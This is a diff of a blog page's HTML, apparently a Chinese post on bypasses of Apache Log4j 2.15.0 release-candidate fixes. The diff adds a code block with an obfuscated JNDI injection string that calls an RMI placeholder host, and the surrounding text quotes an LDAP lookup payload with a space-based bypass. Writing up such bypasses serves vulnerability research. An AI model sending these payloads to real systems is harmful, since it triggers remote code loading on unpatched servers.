@@ -77,7 +77,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">1k</span>
+            <span class="post-count">1.1k</span>
         </span>
     </span>
 
@@ -165,6 +165,10 @@
 </ol>
 <h4 id="更新到rce1"><a href="#更新到rce1" class="headerlink" title="更新到rce1"></a>更新到rce1</h4><p><a target="_blank" rel="noopener" href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1%E3%80%82">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1。</a></p>
 <p>但不久就被绕过了，经过测试发现<code>URI</code>中不进行<code>URL</code>编码会报这个错，加个空格即可触发<code>$&#123;jndi:ldap://127.0.0.1:1389/ badClassName&#125;</code>（需要用户开启<code>lookup</code>功能的基础上才可以）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$&#123;::-j&#125;ndi:rmi:&#x2F;&#x2F;ip:port&#x2F;exp&#125;</span><br></pre></td></tr></table></figure>
+
+
+
 <h4 id="更新到rce2"><a href="#更新到rce2" class="headerlink" title="更新到rce2"></a>更新到rce2</h4><p><a target="_blank" rel="noopener" href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a></p>
 <p>貌似又被绕过了</p>
 <hr>
